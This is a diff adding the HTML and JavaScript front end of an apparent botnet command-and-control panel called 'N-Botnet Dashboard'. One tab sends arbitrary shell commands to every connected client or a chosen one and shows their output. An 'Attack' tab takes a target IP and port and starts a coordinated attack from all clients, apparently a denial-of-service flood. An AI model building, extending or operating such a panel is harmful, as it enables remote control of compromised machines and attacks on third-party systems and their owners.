@@ -1,0 +1,1002 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>N-Botnet Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        :root {
+            --bg: #0a0e17;
+            --surface: #111827;
+            --surface2: #1a2332;
+            --border: #1e293b;
+            --text: #e2e8f0;
+            --text-muted: #64748b;
+            --green: #22c55e;
+            --red: #ef4444;
+            --blue: #3b82f6;
+            --yellow: #eab308;
+            --accent: #6366f1;
+        }
+        
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+        }
+        
+        .header {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 12px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 32px;
+        }
+        
+        .header h1 {
+            font-size: 20px;
+            font-weight: 700;
+            background: linear-gradient(135deg, var(--accent), var(--blue));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .tabs {
+            display: flex;
+            gap: 4px;
+        }
+        
+        .tab-btn {
+            padding: 6px 16px;
+            border: none;
+            background: transparent;
+            color: var(--text-muted);
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: all 0.2s;
+        }
+        
+        .tab-btn:hover {
+            background: var(--surface2);
+            color: var(--text);
+        }
+        
+        .tab-btn.active {
+            background: var(--accent);
+            color: white;
+        }
+        
+        .header .stats {
+            display: flex;
+            gap: 24px;
+            font-size: 14px;
+        }
+        
+        .stat-item {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .stat-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            display: inline-block;
+        }
+        
+        .stat-dot.online { background: var(--green); box-shadow: 0 0 6px var(--green); }
+        .stat-dot.commands { background: var(--blue); box-shadow: 0 0 6px var(--blue); }
+        
+        .tab-content {
+            display: none;
+            height: calc(100vh - 56px);
+        }
+        .tab-content.active {
+            display: flex;
+        }
+        
+        /* === DASHBOARD TAB (existing layout) === */
+        .dash-container {
+            display: grid;
+            grid-template-columns: 340px 1fr;
+            gap: 0;
+            height: 100%;
+            width: 100%;
+        }
+        
+        .sidebar {
+            background: var(--surface);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .sidebar-header {
+            padding: 16px;
+            border-bottom: 1px solid var(--border);
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .client-list {
+            flex: 1;
+            overflow-y: auto;
+            padding: 8px;
+        }
+        
+        .client-card {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px;
+            margin-bottom: 8px;
+            cursor: pointer;
+            transition: all 0.2s;
+            position: relative;
+        }
+        
+        .client-card:hover {
+            border-color: var(--accent);
+            transform: translateX(2px);
+        }
+        
+        .client-card.selected {
+            border-color: var(--accent);
+            background: rgba(99, 102, 241, 0.1);
+        }
+        
+        .client-card .client-name {
+            font-weight: 600;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        
+        .client-card .client-ip {
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+        
+        .client-card .client-time {
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+        
+        .client-card .status-badge {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 6px var(--green);
+        }
+        
+        .no-clients {
+            text-align: center;
+            padding: 40px 20px;
+            color: var(--text-muted);
+        }
+        
+        .no-clients .icon {
+            font-size: 48px;
+            margin-bottom: 12px;
+            opacity: 0.5;
+        }
+        
+        .no-clients p {
+            font-size: 14px;
+        }
+        
+        .main-panel {
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+        }
+        
+        .command-bar {
+            padding: 16px;
+            border-bottom: 1px solid var(--border);
+            background: var(--surface);
+        }
+        
+        .command-input-group {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .command-input {
+            flex: 1;
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px 16px;
+            color: var(--text);
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            font-size: 14px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        
+        .command-input:focus {
+            border-color: var(--accent);
+        }
+        
+        .command-input::placeholder {
+            color: var(--text-muted);
+        }
+        
+        .btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            white-space: nowrap;
+        }
+        
+        .btn-primary {
+            background: var(--accent);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #5558e6;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(99, 102, 241, 0.4);
+        }
+
+        .btn-success {
+            background: var(--green);
+            color: white;
+        }
+        .btn-success:hover {
+            background: #16a34a;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(34, 197, 94, 0.4);
+        }
+        
+        .btn-danger {
+            background: var(--red);
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #dc2626;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(239, 68, 68, 0.4);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            color: var(--text);
+            border: 1px solid var(--border);
+        }
+        
+        .btn-outline:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+        }
+        
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
+        }
+        
+        .target-info {
+            margin-top: 8px;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+        
+        .target-info strong {
+            color: var(--accent);
+        }
+        
+        .response-area {
+            flex: 1;
+            overflow-y: auto;
+            padding: 16px;
+            background: var(--bg);
+        }
+        
+        .response-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            margin-bottom: 12px;
+            overflow: hidden;
+            animation: slideIn 0.3s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .response-header {
+            padding: 10px 16px;
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background: var(--surface2);
+        }
+        
+        .response-header .cmd-text {
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            font-size: 13px;
+            color: var(--yellow);
+        }
+        
+        .response-header .cmd-target {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+        
+        .response-header .cmd-time {
+            font-size: 11px;
+            color: var(--text-muted);
+        }
+        
+        .response-body {
+            padding: 12px 16px;
+        }
+        
+        .response-client {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+            font-size: 12px;
+            color: var(--accent);
+            font-weight: 600;
+        }
+        
+        .response-output {
+            background: #0d1117;
+            border: 1px solid #1e293b;
+            border-radius: 6px;
+            padding: 12px;
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            font-size: 12px;
+            line-height: 1.6;
+            white-space: pre-wrap;
+            word-break: break-all;
+            color: #e2e8f0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .response-output .empty {
+            color: var(--text-muted);
+            font-style: italic;
+        }
+        
+        .pending-badge {
+            font-size: 11px;
+            color: var(--yellow);
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* === ATTACK TAB === */
+        .attack-container {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            width: 100%;
+        }
+        
+        .attack-top-bar {
+            background: var(--surface);
+            border-bottom: 1px solid var(--border);
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            flex-wrap: wrap;
+        }
+        
+        .attack-top-bar .input-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .attack-top-bar label {
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+        
+        .attack-input {
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 10px 14px;
+            color: var(--text);
+            font-family: 'Cascadia Code', 'Fira Code', monospace;
+            font-size: 14px;
+            outline: none;
+            width: 160px;
+            transition: border-color 0.2s;
+        }
+        
+        .attack-input:focus {
+            border-color: var(--accent);
+        }
+        
+        .attack-input::placeholder {
+            color: var(--text-muted);
+        }
+        
+        .attack-input.port {
+            width: 100px;
+        }
+        
+        .attack-controls {
+            display: flex;
+            gap: 8px;
+            margin-left: 8px;
+        }
+        
+        .attack-status-badge {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 13px;
+            padding: 6px 14px;
+            border-radius: 6px;
+            margin-left: auto;
+        }
+        
+        .attack-status-badge.idle {
+            background: rgba(100, 116, 139, 0.15);
+            color: var(--text-muted);
+        }
+        
+        .attack-status-badge.running {
+            background: rgba(34, 197, 94, 0.15);
+            color: var(--green);
+            animation: pulse 1.5s infinite;
+        }
+        
+        .attack-status-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+        }
+        
+        .attack-status-dot.idle { background: var(--text-muted); }
+        .attack-status-dot.running { background: var(--green); box-shadow: 0 0 8px var(--green); }
+        
+        .attack-console {
+            flex: 1;
+            background: #0d1117;
+            overflow-y: auto;
+            padding: 16px 20px;
+            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
+            font-size: 13px;
+            line-height: 1.7;
+        }
+        
+        .attack-console .line {
+            white-space: pre-wrap;
+            word-break: break-all;
+            animation: fadeIn 0.2s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .attack-console .line.time {
+            color: var(--text-muted);
+        }
+        .attack-console .line.info {
+            color: var(--blue);
+        }
+        .attack-console .line.success {
+            color: var(--green);
+        }
+        .attack-console .line.error {
+            color: var(--red);
+        }
+        .attack-console .line.warn {
+            color: var(--yellow);
+        }
+        .attack-console .line.output {
+            color: #e2e8f0;
+        }
+        .attack-console .line.client-label {
+            color: var(--accent);
+            font-weight: 600;
+        }
+        .attack-console .line.separator {
+            color: var(--border);
+            text-align: center;
+            border-top: 1px solid var(--border);
+            padding-top: 8px;
+            margin-top: 8px;
+        }
+        
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 12px 20px;
+            font-size: 14px;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+            animation: slideUp 0.3s ease-out;
+            z-index: 1000;
+        }
+        
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .toast.success { border-left: 3px solid var(--green); }
+        .toast.error { border-left: 3px solid var(--red); }
+        .toast.info { border-left: 3px solid var(--blue); }
+        
+        ::-webkit-scrollbar { width: 6px; height: 6px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+        ::-webkit-scrollbar-thumb:hover { background: var(--text-muted); }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-left">
+            <h1>◈ N-Botnet Dashboard</h1>
+            <div class="tabs">
+                <button class="tab-btn active" onclick="switchTab('dashboard')">📋 Dashboard</button>
+                <button class="tab-btn" onclick="switchTab('attack')">⚡ Attack</button>
+            </div>
+        </div>
+        <div class="stats">
+            <div class="stat-item">
+                <span class="stat-dot online"></span>
+                <span id="clientCount">0</span> clients
+            </div>
+            <div class="stat-item">
+                <span class="stat-dot commands"></span>
+                <span id="cmdCount">0</span> commands
+            </div>
+        </div>
+    </div>
+
+    <!-- Dashboard Tab -->
+    <div class="tab-content active" id="tab-dashboard">
+        <div class="dash-container">
+            <div class="sidebar">
+                <div class="sidebar-header">Connected Clients</div>
+                <div class="client-list" id="clientList">
+                    <div class="no-clients">
+                        <div class="icon">⚡</div>
+                        <p>Waiting for clients to connect...</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="main-panel">
+                <div class="command-bar">
+                    <div class="command-input-group">
+                        <input type="text" class="command-input" id="cmdInput" 
+                               placeholder="Enter command to execute on clients..."
+                               onkeydown="if(event.key==='Enter') sendCommand()">
+                        <button class="btn btn-primary" id="sendBtn" onclick="sendCommand()">▶ Send to All</button>
+                        <button class="btn btn-outline" onclick="clearResponses()">✕ Clear</button>
+                    </div>
+                    <div class="target-info">
+                        Sending to: <strong id="targetLabel">all connected clients</strong>
+                    </div>
+                </div>
+
+                <div class="response-area" id="responseArea">
+                    <div style="text-align:center; padding:60px 20px; color:var(--text-muted);">
+                        <div style="font-size:40px; margin-bottom:12px; opacity:0.4;">⌨</div>
+                        <p>Commands and responses will appear here</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Attack Tab -->
+    <div class="tab-content" id="tab-attack">
+        <div class="attack-container">
+            <div class="attack-top-bar">
+                <div class="input-group">
+                    <label>Target IP:</label>
+                    <input type="text" class="attack-input" id="attackIp" placeholder="e.g. 192.168.1.1">
+                </div>
+                <div class="input-group">
+                    <label>Port:</label>
+                    <input type="text" class="attack-input port" id="attackPort" placeholder="e.g. 80">
+                </div>
+                <div class="attack-controls">
+                    <button class="btn btn-success" id="attackStartBtn" onclick="attackStart()">▶ Start</button>
+                    <button class="btn btn-danger" id="attackStopBtn" onclick="attackStop()" disabled>■ Stop</button>
+                </div>
+                <div class="attack-status-badge idle" id="attackStatus">
+                    <span class="attack-status-dot idle" id="attackStatusDot"></span>
+                    <span id="attackStatusText">Idle</span>
+                </div>
+            </div>
+
+            <div class="attack-console" id="attackConsole">
+                <div class="line info">[N-Botnet Attack Console]</div>
+                <div class="line info">[*] Enter target IP:Port and click Start</div>
+                <div class="line time">──────────────────────────</div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ===== TAB SWITCHING =====
+        function switchTab(tab) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById(`tab-${tab}`).classList.add('active');
+            document.querySelector(`.tab-btn[onclick*="'${tab}'"]`).classList.add('active');
+        }
+
+        // ===== STATE =====
+        let clients = {};
+        let selectedClient = 'all';
+        let pollInterval = null;
+        let lastHistoryLen = 0;
+        let attackActive = false;
+        let lastCmdCount = 0;
+
+        // ===== POLLING =====
+        async function fetchClients() {
+            try {
+                const res = await fetch('/api/clients');
+                const data = await res.json();
+                renderClients(data);
+                document.getElementById('clientCount').textContent = data.length;
+            } catch (e) {}
+        }
+
+        async function fetchHistory() {
+            try {
+                const res = await fetch('/api/history');
+                const data = await res.json();
+                document.getElementById('cmdCount').textContent = data.length;
+                renderResponses(data);
+            } catch (e) {}
+        }
+
+        async function fetchAttackStatus() {
+            try {
+                const res = await fetch('/api/attack/status');
+                const data = await res.json();
+                updateAttackUI(data);
+            } catch (e) {}
+        }
+
+        // ===== RENDER CLIENTS =====
+        function renderClients(clientList) {
+            const container = document.getElementById('clientList');
+            if (clientList.length === 0) {
+                container.innerHTML = `
+                    <div class="no-clients">
+                        <div class="icon">⚡</div>
+                        <p>Waiting for clients to connect...</p>
+                        <p style="font-size:12px; margin-top:8px;">Run: python3 client.py &lt;server_ip&gt;</p>
+                    </div>
+                `;
+                return;
+            }
+            clientList.forEach(c => { clients[c.id] = c; });
+            container.innerHTML = clientList.map(c => `
+                <div class="client-card ${selectedClient === c.id ? 'selected' : ''}" 
+                     onclick="selectClient('${c.id}')">
+                    <div class="status-badge"></div>
+                    <div class="client-name">${c.hostname}</div>
+                    <div class="client-ip">${c.ip}</div>
+                    <div class="client-time">Connected: ${c.connected_at}</div>
+                </div>
+            `).join('');
+        }
+
+        function selectClient(clientId) {
+            selectedClient = clientId;
+            const btn = document.getElementById('sendBtn');
+            const label = document.getElementById('targetLabel');
+            if (clientId === 'all') {
+                label.textContent = 'all connected clients';
+                btn.textContent = '▶ Send to All';
+            } else {
+                const c = clients[clientId];
+                label.textContent = c ? c.hostname + ' (' + c.ip + ')' : clientId;
+                btn.textContent = '▶ Send to Client';
+            }
+            fetchClients();
+        }
+
+        // ===== SEND COMMAND =====
+        async function sendCommand() {
+            const input = document.getElementById('cmdInput');
+            const command = input.value.trim();
+            if (!command) { showToast('Please enter a command', 'error'); return; }
+
+            const btn = document.getElementById('sendBtn');
+            btn.disabled = true;
+            btn.textContent = '⏳ Sending...';
+
+            try {
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ command, target: selectedClient })
+                });
+                const data = await res.json();
+                if (data.success) {
+                    showToast(data.message, 'success');
+                    input.value = '';
+                    fetchHistory();
+                } else {
+                    showToast('Error: ' + (data.error || 'Unknown'), 'error');
+                }
+            } catch (e) {
+                showToast('Failed: ' + e.message, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.textContent = selectedClient === 'all' ? '▶ Send to All' : '▶ Send to Client';
+            }
+        }
+
+        // ===== RENDER RESPONSES =====
+        function renderResponses(history) {
+            const container = document.getElementById('responseArea');
+            const isNewCommand = history.length > lastHistoryLen;
+            lastHistoryLen = history.length;
+
+            if (history.length === 0) {
+                container.innerHTML = `<div style="text-align:center; padding:60px 20px; color:var(--text-muted);">
+                    <div style="font-size:40px; margin-bottom:12px; opacity:0.4;">⌨</div><p>Commands and responses will appear here</p></div>`;
+                return;
+            }
+
+            container.innerHTML = history.slice().reverse().map(cmd => {
+                const responses = Object.entries(cmd.responses || {});
+                const respCount = responses.length;
+                const clientCount = Object.keys(clients).length;
+                const pending = clientCount > 0 && respCount < clientCount && cmd.target === 'all';
+
+                let bodyHtml = '';
+                if (respCount === 0) {
+                    bodyHtml = `<div class="response-body"><div class="pending-badge">⏳ Waiting for responses...</div></div>`;
+                } else {
+                    bodyHtml = responses.map(([cid, resp]) => {
+                        const client = clients[cid] || { hostname: cid, ip: 'unknown' };
+                        const output = resp.output || '';
+                        const display = output.length > 2000 ? output.slice(0, 2000) + '\n... [truncated]' : output || '<span class="empty">(empty output)</span>';
+                        return `<div class="response-body">
+                            <div class="response-client">◈ ${client.hostname} (${client.ip}) <span style="color:var(--text-muted); font-weight:400;">• ${resp.time || ''}</span></div>
+                            <div class="response-output">${escapeHtml(display)}</div>
+                        </div>`;
+                    }).join('');
+                }
+
+                return `<div class="response-card">
+                    <div class="response-header">
+                        <span class="cmd-text">$ ${escapeHtml(cmd.command)}</span>
+                        <span class="cmd-target">→ ${cmd.target === 'all' ? 'all clients' : cmd.target} 
+                            ${pending ? '<span class="pending-badge">(waiting...)</span>' : ''}
+                        </span>
+                        <span class="cmd-time">${cmd.timestamp}</span>
+                    </div>
+                    ${bodyHtml}
+                </div>`;
+            }).join('');
+
+            if (isNewCommand) container.scrollTop = 0;
+        }
+
+        function clearResponses() {
+            document.getElementById('responseArea').innerHTML = `<div style="text-align:center; padding:60px 20px; color:var(--text-muted);">
+                <div style="font-size:40px; margin-bottom:12px; opacity:0.4;">⌨</div><p>Cleared. Waiting for new commands...</p></div>`;
+        }
+
+        // ===== ATTACK =====
+        function logToConsole(level, text) {
+            const console = document.getElementById('attackConsole');
+            const line = document.createElement('div');
+            line.className = `line ${level}`;
+            line.textContent = text;
+            console.appendChild(line);
+            console.scrollTop = console.scrollHeight;
+        }
+
+        function updateAttackUI(status) {
+            const isActive = status.active;
+            attackActive = isActive;
+            
+            const startBtn = document.getElementById('attackStartBtn');
+            const stopBtn = document.getElementById('attackStopBtn');
+            const statusBadge = document.getElementById('attackStatus');
+            const dot = document.getElementById('attackStatusDot');
+            const text = document.getElementById('attackStatusText');
+
+            if (isActive) {
+                startBtn.disabled = true;
+                stopBtn.disabled = false;
+                statusBadge.className = 'attack-status-badge running';
+                dot.className = 'attack-status-dot running';
+                text.textContent = `Running → ${status.target_ip}:${status.target_port} (${status.client_count} clients)`;
+            } else {
+                startBtn.disabled = false;
+                stopBtn.disabled = true;
+                statusBadge.className = 'attack-status-badge idle';
+                dot.className = 'attack-status-dot idle';
+                text.textContent = 'Idle';
+            }
+        }
+
+        async function attackStart() {
+            const ip = document.getElementById('attackIp').value.trim();
+            const port = document.getElementById('attackPort').value.trim();
+
+            if (!ip || !port) {
+                showToast('Please enter both IP and Port', 'error');
+                return;
+            }
+
+            // Reset response counter for new attack
+            lastCmdCount = 0;
+
+            logToConsole('time', `[${new Date().toLocaleTimeString()}] ──────────────────────────`);
+            logToConsole('info', `[+] Starting task on ${ip}:${port}`);
+            logToConsole('info', `[*] Executing command on all connected clients...`);
+
+            try {
+                const res = await fetch('/api/attack/start', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ ip, port })
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    logToConsole('success', `[✓] ${data.message}`);
+                    logToConsole('time', `[*] Waiting for client responses...`);
+                    updateAttackUI({ active: true, target_ip: ip, target_port: port, client_count: data.sent_to });
+                    showToast(data.message, 'success');
+                } else {
+                    logToConsole('error', `[!] Error: ${data.error || 'Unknown'}`);
+                    showToast('Error: ' + (data.error || 'Unknown'), 'error');
+                }
+            } catch (e) {
+                logToConsole('error', `[!] Failed to start: ${e.message}`);
+                showToast('Failed: ' + e.message, 'error');
+            }
+        }
+
+        async function attackStop() {
+            logToConsole('warn', `[■] Stopping task...`);
+
+            try {
+                const res = await fetch('/api/attack/stop', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' }
+                });
+                const data = await res.json();
+
+                if (data.success) {
+                    logToConsole('warn', `[■] ${data.message}`);
+                    logToConsole('time', `[${new Date().toLocaleTimeString()}] ──────────────────────────`);
+                    updateAttackUI({ active: false });
+                    showToast(data.message, 'info');
+                } else {
+                    logToConsole('error', `[!] Error: ${data.error || 'Unknown'}`);
+                }
+            } catch (e) {
+                logToConsole('error', `[!] Failed to stop: ${e.message}`);
+                showToast('Failed: ' + e.message, 'error');
+            }
+        }
+
+        // ===== UTILITY =====
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 3000);
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // ===== HISTORY POLLING (for Attack console) =====
+        async function pollAttackResponses() {
+            try {
+                const res = await fetch('/api/history');
+                const history = await res.json();
+                
+                // Check for new responses in attack commands
+                for (const cmd of history) {
+                    if (cmd.cmd_id && cmd.cmd_id.startsWith('attack_')) {
+                        const responses = Object.entries(cmd.responses || {});
+                        const respCount = responses.length;
+                        
+                        if (respCount > lastCmdCount) {
+                            // New responses!
+                            for (let i = lastCmdCount; i < respCount; i++) {
+                                const [cid, resp] = responses[i];
+                                const client = clients[cid] || { hostname: cid, ip: 'unknown' };
+                                const output = (resp.output || '').trim();
+                                if (output) {
+                                    logToConsole('client-label', `[${client.hostname}]`);
+                                    const lines = output.split('\n');
+                                    for (const line of lines) {
+                                        if (line.startsWith('[+]')) logToConsole('success', line);
+                                        else if (line.startsWith('[!]')) logToConsole('error', line);
+                                        else if (line.startsWith('[■]')) logToConsole('warn', line);
+                                        else logToConsole('output', line);
+                                    }
+                                }
+                            }
+                            lastCmdCount = respCount;
+                        }
+                    }
+                }
+            } catch (e) {}
+        }
+
+        // ===== INIT =====
+        function init() {
+            fetchClients();
+            fetchHistory();
+            fetchAttackStatus();
+            
+            pollInterval = setInterval(() => {
+                fetchClients();
+                fetchHistory();
+                pollAttackResponses();
+            }, 2000);
+        }
+
+        init();
+    </script>
+</body>
+</html>
